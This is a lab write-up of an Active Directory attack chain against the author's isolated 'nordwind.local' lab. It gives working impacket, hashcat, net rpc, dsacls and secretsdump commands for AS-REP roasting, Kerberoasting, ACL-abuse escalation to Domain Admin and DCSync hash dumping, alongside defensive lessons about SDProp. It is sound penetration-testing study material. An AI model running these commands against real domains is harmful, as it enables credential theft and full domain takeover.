# Phase 3 — Attack

> Exploiting, from an attacker machine, the misconfigurations planted in
> [Phase 2](phase2-sabotage.md). Goal: start with **zero credentials** and work up to
> **Domain Admin**, entirely with manual, OSCP-friendly tooling (impacket, netexec,
> hashcat — no Metasploit).

| Step | Attack | Result | Status |
|------|--------|--------|--------|
| 1 | AS-REP Roasting | `piotr.wisniewski : Autumn2024!` | ✅ Done |
| 2 | Kerberoasting | `svc_sql : Summer2023!` | ✅ Done |
| 3 | ACL chain (ForceChangePassword → GenericAll) | `robert` → Domain Admins | ✅ Done |
| 4 | DCSync | dump of all domain hashes (krbtgt + Administrator) | ✅ Done |
| 5 | BloodHound (post-mortem) | path analysis + a lesson on snapshot timing | ✅ Done |

---

## Attacker setup

The lab lives on an **isolated** VirtualBox Internal Network (`NordwindLAN`), so the
attacker box must sit on that same network. Kali was given **two adapters**:

- **Adapter 1 — NAT:** internet (tool installs, wordlists).
- **Adapter 2 — Internal Network `NordwindLAN`:** reaches the lab.

The internal adapter uses a static address, and the DC's FQDN is added to `/etc/hosts`:

```bash
sudo ip addr add 192.168.10.50/24 dev eth1
echo "192.168.10.10 dc01.nordwind.local nordwind.local dc01" | sudo tee -a /etc/hosts
```

> The FQDN mapping matters: Kerberos ties tickets to the service FQDN, not the IP, so name
> resolution must resolve the DC or the Kerberos attacks fail.

Connectivity confirmed — the open-port fingerprint is a textbook Domain Controller:

```
nmap -Pn -p 53,88,135,389,445,636,3268 192.168.10.10
53/tcp   open  domain
88/tcp   open  kerberos-sec      ← Kerberos
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP     ← Global Catalog
```

---

## Step 1 — AS-REP Roasting (no credentials)

The only prerequisite is a list of usernames (known here because it is my own lab; in a
real engagement these come from RID cycling or `kerbrute userenum`).

```bash
impacket-GetNPUsers nordwind.local/ -usersfile users.txt -no-pass \
  -dc-ip 192.168.10.10 -format hashcat -outputfile asrep.txt
```

Only the account with pre-auth disabled returned a hash; every other user returned
`doesn't have UF_DONT_REQUIRE_PREAUTH set`. This is the attack's signature: fire at the
whole list, only the misconfigured account falls.

```bash
hashcat -m 18200 asrep.txt seasons.txt --force      # → piotr.wisniewski : Autumn2024!
```

**Wordlist note:** `Autumn2024!` is *not* in `rockyou.txt` — it is a
*season + year + symbol* pattern, not a leaked password. It was cracked with a **targeted
wordlist** generated from that pattern. Suspecting and modelling corporate password
patterns is a core OSCP skill.

Credential validated over SMB:

```bash
netexec smb 192.168.10.10 -u piotr.wisniewski -p 'Autumn2024!'
# [+] nordwind.local\piotr.wisniewski:Autumn2024!
```

---

## Step 2 — Kerberoasting (with piotr's credentials)

Now authenticated, the tool asks the DC over LDAP which accounts carry an SPN, then
requests a TGS for each — so no username list is needed this time.

```bash
impacket-GetUserSPNs nordwind.local/piotr.wisniewski:'Autumn2024!' \
  -dc-ip 192.168.10.10 -request -outputfile kerb.txt
# lists svc_sql  ->  MSSQLSvc/dc01.nordwind.local:1433
```

```bash
hashcat -m 13100 kerb.txt seasons.txt --force       # → svc_sql : Summer2023!
```

> Mode `18200` (AS-REP) vs `13100` (Kerberoasting) — different ticket, same offline
> cracking idea.

---

## Step 3 — ACL chain to Domain Admin

The chain planted in Phase 2:
`piotr --ForceChangePassword--> robert --GenericAll--> Domain Admins`.

**Hop 1 — as piotr, reset robert's password.** Works on the first try: piotr's ACL over
robert is not protected, so the reset goes through.

```bash
net rpc password robert.dabrowski 'NewPass123!' \
    -U 'nordwind.local/piotr.wisniewski%Autumn2024!' -S 192.168.10.10
netexec smb 192.168.10.10 -u robert.dabrowski -p 'NewPass123!'
# [+] nordwind.local\robert.dabrowski:NewPass123!   ← robert owned
```

**Hop 2 — as robert, add self to Domain Admins.** This is where the lab fought back:

```bash
net rpc group addmem "Domain Admins" robert.dabrowski \
    -U 'nordwind.local/robert.dabrowski%NewPass123!' -S 192.168.10.10
# NT_STATUS_ACCESS_DENIED
```

`ACCESS_DENIED` — not a mistake, a **defense firing in real time**. `Domain Admins` is a
**protected group**: **AdminSDHolder / SDProp** restores a clean ACL onto it (and onto its
members) roughly every 60 minutes, so the `GenericAll` granted to robert in Phase 2 had
already been reverted. This is exactly defense #4 from my own `acl-abuse` note, catching me
in the act.

**Winning the race.** Re-plant the ACL on the DC, then run immediately (inside the <60 min
window before SDProp reverts it again):

```powershell
# On DC01 (PowerShell, elevated)
$da = (Get-ADGroup "Domain Admins").DistinguishedName
dsacls "$da" /G "NORDWIND\robert.dabrowski:GA"
```

```bash
# On Kali, immediately
net rpc group addmem "Domain Admins" robert.dabrowski \
    -U 'nordwind.local/robert.dabrowski%NewPass123!' -S 192.168.10.10
netexec smb 192.168.10.10 -u robert.dabrowski -p 'NewPass123!'
# NORDWIND\robert.dabrowski (Pwn3d!)   ← Domain Admin 👑
```

- [x] Execute hop 1 and confirm robert's new credentials
- [x] Execute hop 2 and confirm `(Pwn3d!)` (Domain Admin)
- [x] Understand why hop 2 first failed (AdminSDHolder / SDProp on protected groups)

## Step 4 — DCSync

As Domain Admin, abuse the directory-replication right (DRSUAPI) to ask the DC to
replicate every secret — no touching LSASS, no binaries dropped on disk.

```bash
impacket-secretsdump nordwind.local/robert.dabrowski:'NewPass123!'@192.168.10.10 -just-dc
# Administrator:500:aad3b435...:<NTLM>:::   → Pass-the-Hash to anything
# krbtgt:502:aad3b435...:<NTLM>:::          → Golden Ticket (full domain persistence)
```

- [x] Run secretsdump and capture krbtgt + Administrator hashes

**Full domain compromise achieved — from zero credentials to krbtgt.**

---

## Step 5 — BloodHound path analysis

With the domain already owned, I collected the graph from Kali using piotr's
(low-privilege) credentials — proof that a single unprivileged account can map the whole
domain over LDAP:

```bash
bloodhound-python -u piotr.wisniewski -p 'Autumn2024!' \
    -d nordwind.local -ns 192.168.10.10 -c All --zip
```

Then "Shortest Paths to Domain Admins" **did not show piotr**. Querying the graph directly
explained why — piotr had only `MemberOf → Domain Users`, nothing else:

```cypher
MATCH (u:User)-[r]->(n) WHERE toLower(u.name) CONTAINS 'piotr' RETURN u, r, n
```

The chain had been **dismantled by SDProp at two levels**: once robert joined Domain Admins
he became a protected account (`adminCount=1`), so SDProp rewrote *his* ACL too and removed
the `ForceChangePassword` piotr held over him. I had collected **after** exploiting, so the
snapshot was taken "after the crime".

> **Key takeaway:** BloodHound is a **point-in-time snapshot**. Collect it **first**, with
> the domain in its vulnerable state, then exploit — not the other way round. A drawn path
> can also already be dead (SDProp reverts within the hour), so the graph shows what *was*
> true at collection, not what is live at attack time.

---

## Lessons learned

- **A defense can look like an attacker mistake.** `ACCESS_DENIED` on hop 2 was AdminSDHolder
  working, not a broken command. Reading the error in context beats blindly retrying.
- **Protected groups self-heal.** AdminSDHolder/SDProp restore ACLs on privileged groups and
  their members ~hourly — never rely on a direct ACL against them; win the race or find
  another path.
- **BloodHound first, exploit second.** (See Step 5.)
- **One unprivileged account maps the whole domain** — LDAP is readable by any authenticated
  user by design.

## Tooling used

| Tool | Role |
|------|------|
| `nmap` | DC fingerprinting |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `impacket-GetUserSPNs` | Kerberoasting |
| `hashcat` (`-m 18200` / `-m 13100`) | offline cracking |
| `netexec` | credential validation / enumeration (`[+]`, `(Pwn3d!)`) |
| `net rpc` (Samba) | ACL abuse (password reset, group membership) |
| `dsacls` (on DC) | re-planting the ACL to win the SDProp race |
| `impacket-secretsdump` | DCSync |
| `bloodhound-python` + BloodHound CE | attack-path graph analysis |
